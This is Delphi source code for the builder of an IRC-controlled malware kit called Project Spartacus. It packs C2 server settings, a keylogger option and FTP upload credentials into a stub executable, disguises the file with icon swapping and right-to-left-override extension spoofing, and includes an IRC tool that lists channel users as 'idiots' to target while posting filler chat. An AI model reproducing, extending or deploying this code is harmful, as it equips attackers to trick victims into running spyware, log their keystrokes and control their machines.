// Project Spartacus 1.0
// (C) Doddy Hackman 2014

unit builder;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls,
  Vcl.StdCtrls,
  IdContext, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,
  IdCmdTCPClient, IdIRC, MadRes, StrUtils, Vcl.Imaging.pngimage, Math;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    StatusBar1: TStatusBar;
    TabSheet2: TTabSheet;
    PageControl2: TPageControl;
    TabSheet3: TTabSheet;
    notificar: TTrayIcon;
    TabSheet5: TTabSheet;
    use_keylooger: TCheckBox;
    GroupBox1: TGroupBox;
    Label7: TLabel;
    ftp_host: TEdit;
    Label8: TLabel;
    ftp_user: TEdit;
    Label9: TLabel;
    ftp_pass: TEdit;
    Label10: TLabel;
    ftp_path: TEdit;
    TabSheet6: TTabSheet;
    GroupBox2: TGroupBox;
    select_path: TRadioButton;
    directorios: TComboBox;
    i_use_this: TRadioButton;
    directorio: TEdit;
    GroupBox3: TGroupBox;
    foldername: TEdit;
    TabSheet7: TTabSheet;
    GroupBox4: TGroupBox;
    Button1: TButton;
    PageControl3: TPageControl;
    TabSheet9: TTabSheet;
    check_extension_changer: TCheckBox;
    GroupBox9: TGroupBox;
    check_extension: TCheckBox;
    extensiones: TComboBox;
    GroupBox10: TGroupBox;
    check_this_extension: TCheckBox;
    extension: TEdit;
    TabSheet10: TTabSheet;
    GroupBox11: TGroupBox;
    ruta_icono: TEdit;
    Button3: TButton;
    GroupBox12: TGroupBox;
    preview: TImage;
    use_icon_changer: TCheckBox;
    GroupBox6: TGroupBox;
    Label5: TLabel;
    Label6: TLabel;
    boss: TEdit;
    timeout: TEdit;
    GroupBox13: TGroupBox;
    use_this_nick: TRadioButton;
    nick: TEdit;
    nick_generated: TRadioButton;
    GroupBox5: TGroupBox;
    Label1: TLabel;
    irc_host: TEdit;
    Label2: TLabel;
    irc_other_host: TEdit;
    Label3: TLabel;
    irc_port: TEdit;
    Label4: TLabel;
    irc_channel: TEdit;
    PageControl4: TPageControl;
    TabSheet4: TTabSheet;
    TabSheet11: TTabSheet;
    GroupBox14: TGroupBox;
    idiots: TListBox;
    Button2: TButton;
    GroupBox15: TGroupBox;
    TabSheet12: TTabSheet;
    irc: TIdIRC;
    Button4: TButton;
    GroupBox16: TGroupBox;
    Label11: TLabel;
    Label13: TLabel;
    Label14: TLabel;
    finder_host: TEdit;
    finder_port: TEdit;
    finder_channel: TEdit;
    Label12: TLabel;
    finder_nick: TEdit;
    console: TMemo;
    GroupBox17: TGroupBox;
    Image1: TImage;
    Label15: TLabel;
    Image2: TImage;
    irc_cop: TTimer;
    abrir: TOpenDialog;
    procedure FormCreate(Sender: TObject);
    procedure notificarClick(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure ircNicknamesListReceived(ASender: TIdContext;
      const AChannel: string; ANicknameList: TStrings);
    procedure Button2Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure ircRaw(ASender: TIdContext; AIn: Boolean; const AMessage: string);
    procedure ircJoin(ASender: TIdContext;
      const ANickname, AHost, AChannel: string);
    procedure ircPart(ASender: TIdContext; const ANickname, AHost, AChannel,
      APartMessage: string);
    procedure irc_copTimer(Sender: TObject);
    procedure Button3Click(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

procedure extension_changer(archivo: string; extension: string);
var
  nombre: string;
begin
  nombre := ExtractFileName(archivo);
  nombre := StringReplace(nombre, ExtractFileExt(nombre), '',
    [rfReplaceAll, rfIgnoreCase]);
  nombre := nombre + char(8238) + ReverseString('.' + extension) + '.exe';
  MoveFile(PChar(archivo), PChar(ExtractFilePath(archivo) + nombre));
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

procedure TForm1.Button1Click(Sender: TObject);

var
  linea: string;
  aca: THandle;
  code: Array [0 .. 9999 + 1] of char;
  nose: DWORD;
  marca_uno: string;
  marca_dos: string;
  url: string;
  opcionocultar: string;
  savein: string;
  lineafinal: string;
  stubgenerado: string;
  tipodecarga: string;
  change: DWORD;
  valor: string;
  ruta_archivo: string;
  tipocantidadz: string;
  extensionacambiar: string;

  control_use_this_nick: string;
  control_nick_generated: string;
  control_use_keylogger: string;
  control_select_path: string;
  control_i_use_this: string;
begin

  stubgenerado := 'spartacus.exe';

  if (FileExists(stubgenerado)) then
  begin
    DeleteFile(stubgenerado);
  end;

  if (use_this_nick.Checked) then
  begin
    control_use_this_nick := '1';
  end
  else
  begin
    control_use_this_nick := '0';
  end;

  if (nick_generated.Checked) then
  begin
    control_nick_generated := '1';
  end
  else
  begin
    control_nick_generated := '0';
  end;

  if (use_keylooger.Checked) then
  begin
    control_use_keylogger := '1';
  end
  else
  begin
    control_use_keylogger := '0';
  end;

  if (select_path.Checked) then
  begin
    control_select_path := '1';
  end
  else
  begin
    control_select_path := '0';
  end;

  if (i_use_this.Checked) then
  begin
    control_i_use_this := '1';
  end
  else
  begin
    control_i_use_this := '0';
  end;

  lineafinal := '[irc_host]' + irc_host.Text + '[irc_host]' + '[irc_other_host]'
    + irc_other_host.Text + '[irc_other_host]' + '[irc_port]' + irc_port.Text +
    '[irc_port]' + '[irc_channel]' + irc_channel.Text + '[irc_channel]' +
    '[use_this_nick]' + control_use_this_nick + '[use_this_nick]' + '[nick]' +
    nick.Text + '[nick]' + '[nick_generated]' + control_nick_generated +
    '[nick_generated]' + '[boss]' + boss.Text + '[boss]' + '[timeout]' +
    timeout.Text + '[timeout]' + '[use_keylogger]' + control_use_keylogger +
    '[use_keylogger]' + '[ftp_host]' + ftp_host.Text + '[ftp_host]' +
    '[ftp_user]' + ftp_user.Text + '[ftp_user]' + '[ftp_pass]' + ftp_pass.Text +
    '[ftp_pass]' + '[ftp_path]' + ftp_path.Text + '[ftp_path]' + '[select_path]'
    + control_select_path + '[select_path]' + '[directorios]' + directorios.Text
    + '[directorios]' + '[i_use_this]' + control_i_use_this + '[i_use_this]' +
    '[directorio]' + directorio.Text + '[directorio]' + '[folder]' +
    foldername.Text + '[folder]';

  marca_uno := '[63686175]' + dhencode(lineafinal, 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' +
    'Data/spartacus.exe'), PChar(ExtractFilePath(Application.ExeName) + '/' +
    stubgenerado), True);

  linea := marca_uno;
  StrCopy(code, PChar(linea));
  aca := CreateFile(PChar(stubgenerado), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  //

  ruta_archivo := PChar(ExtractFilePath(Application.ExeName) + '/' +
    stubgenerado);

  if (use_icon_changer.Checked) then
  begin
    try
      begin
        change := BeginUpdateResourceW
          (PWideChar(wideString(ruta_archivo)), False);
        LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
          PWideChar(wideString(ruta_icono.Text)));
        EndUpdateResourceW(change, False);
      end;
    except
      begin
        //
      end;
    end;
  end;

  if (check_extension_changer.Checked) then
  begin
    if not(check_extension.Checked and check_this_extension.Checked) then
    begin
      if (check_extension.Checked) then
      begin
        extensionacambiar := extensiones.Items[extensiones.ItemIndex];
        extension_changer(ruta_archivo, extensionacambiar);
      end;
      if (check_this_extension.Checked) then
      begin
        extension_changer(ruta_archivo, extension.Text);
      end;
    end;
  end;

  StatusBar1.Panels[0].Text := '[+] Done';
  Form1.StatusBar1.Update;

end;

procedure TForm1.Button2Click(Sender: TObject);
var
  nick: string;
begin

  console.Lines.Clear;

  nick := finder_nick.Text;
  irc.Host := finder_host.Text;
  irc.Port := StrToInt(finder_port.Text);
  irc.Nickname := nick;
  irc.AltNickname := nick + '123';
  irc.Username := nick;
  irc.RealName := nick;
  irc.Password := '';

  try
    begin
      irc.Connect;
      irc.Join(finder_channel.Text);
      irc_cop.Enabled := True;
      StatusBar1.Panels[0].Text := '[+] Finding idiots ...';
      StatusBar1.Update;
    end;
  except
    begin
      StatusBar1.Panels[0].Text := '[-] Error connecting';
      StatusBar1.Update;
    end;
  end;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
  if (abrir.execute) then
  begin
    ruta_icono.Text := abrir.FileName;
    preview.Picture.LoadFromFile(abrir.FileName);
  end;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
  try
    begin
      irc_cop.Enabled := False;
      irc.Part('?');
      irc.Disconnect();
      StatusBar1.Panels[0].Text := '[+] Disconnected';
      StatusBar1.Update;
    end;
  except
    //
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  abrir.InitialDir := GetCurrentDir;
  abrir.Filter := 'ICO|*.ico|';

  // Hide();
  // WindowState := wsMinimized;
  // notificar.ShowBalloonHint;
end;

procedure TForm1.ircJoin(ASender: TIdContext;
  const ANickname, AHost, AChannel: string);
begin
  if not(ANickname = finder_nick.Text) then
  begin
    idiots.Items.Add(ANickname);
    notificar.BalloonTitle := 'Idiot Found';
    notificar.BalloonHint := ANickname;
    notificar.ShowBalloonHint;
  end;
end;

procedure TForm1.ircNicknamesListReceived(ASender: TIdContext;
  const AChannel: string; ANicknameList: TStrings);
var
  idiot: string;
begin
  {
    for idiot in ANicknameList do
    begin
    idiots.Items.Add(idiot);
    end;
  }
end;

procedure TForm1.ircPart(ASender: TIdContext; const ANickname, AHost, AChannel,
  APartMessage: string);
begin
  idiots.Items.Delete(idiots.Items.IndexOf(ANickname));
end;

procedure TForm1.ircRaw(ASender: TIdContext; AIn: Boolean;
  const AMessage: string);
begin
  console.Lines.Add(AMessage);
end;

procedure TForm1.irc_copTimer(Sender: TObject);
const
  frases: array [1 .. 18] of string = ('Hola', 'Como andan', 'Como estas',
    'Que cuentan', 'Hoy estuvo genial', 'Oh Yeah', 'Que ondaaaaaaaaaaaaaaa',
    'De donde son', 'De donde sos', 'Estoy hablando con los grillos',
    'ajajajajaja', 'ahahaahahaha', 'Que dia de ****', 'Que hora tienen alla',
    'xD', 'LOL', 'WTF', 'OMG');
begin
  while ('1' = '1') do
  begin
    sleep(60000);
    irc.Say(finder_channel.Text, frases[RandomRange(1, 19)]);
  end;
end;

procedure TForm1.notificarClick(Sender: TObject);
begin
  Show();
  WindowState := wsNormal;
  Application.BringToFront();
end;

end.

// The End ?
